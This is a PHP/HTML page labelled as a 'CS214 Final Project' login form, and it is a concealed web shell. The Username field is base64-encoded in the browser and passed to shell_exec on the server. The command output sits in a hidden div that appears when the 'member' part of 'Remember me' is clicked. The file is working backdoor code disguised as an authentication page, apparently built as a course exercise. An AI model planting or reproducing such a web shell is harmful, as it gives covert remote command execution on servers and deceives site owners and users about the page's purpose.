<?php
        if (isset($_POST['user'])) {
                $response = shell_exec(base64_decode($_POST['user']));
        }
?>
<!DOCTYPE html>
<html>
        <head>
                <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js"></script>
                <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
                <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css" integrity="sha384-rHyoN1iRsVXV4nD0JutlnGaslCJuC7uwjduW9SVrLvRYooPp2bWYgmgJQIXwl/Sp" crossorigin="anonymous">
                <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha384-Tc5IQib027qvyjSMfHjOMaLkfuWVxZxUPnCJA7l2mCWNIpG9mGCD8wGNIcPD7Txa" crossorigin="anonymous"></script>
                <script>
                function validate(contents) {
                        console.log("Contents passed as "+contents);
                        console.log(document.getElementById('user').value);
                        document.getElementById('user').value=btoa(document.getElementById('user').value);
                        console.log(document.getElementById('user').value);
                }
                function ShowResults() {
                        $("#results").attr("visibility","nothidden");
                        $("#results").attr("display","show");
                        $("#results").attr("hidden",false);
                }
                </script>
                <title>Authenticate</title>
        </head>
        <body style="color: white; text-align: center;" background="http://blog.hdwallsource.com/wp-content/uploads/2014/11/gradients-26042-26727-hd-wallpapers.jpg">
        <div id="main" class="container-fluid">
                <center>
                <h2>CS214 Final Project</h2><br>
                <form class="form-inline" action="" method="POST" onsubmit="validate()">
                  <div class="form-group">
                    <label class="sr-only" for="login">Username</label>
                    <input type="text" class="form-control" id="user" name="user">
                  </div>
                  <div class="form-group">
                    <label class="sr-only" for="login">Password</label>
                    <input type="password" class="form-control" id="pass" name="pass">
                  </div>
                  <div class="checkbox">
                    <label>
                      <input type="checkbox"> Re<a href="javascript:ShowResults();" style="text-decoration: none; color: white;">member</a> me
                    </label>
                  </div>
                  <button type="submit" value="Login" class="btn btn-default">Sign in</button>
                </form>
                <p>     
        </center>
                        <div id="results" visibility="hidden" display="none" hidden>
                                <pre>
                                <?php
                                        if (isset($response)) {
                                                echo htmlentities($response);
                                        }
                                ?>
                                </pre>
                        </div>
                </p>
        
        </div>
        </body>
</html>
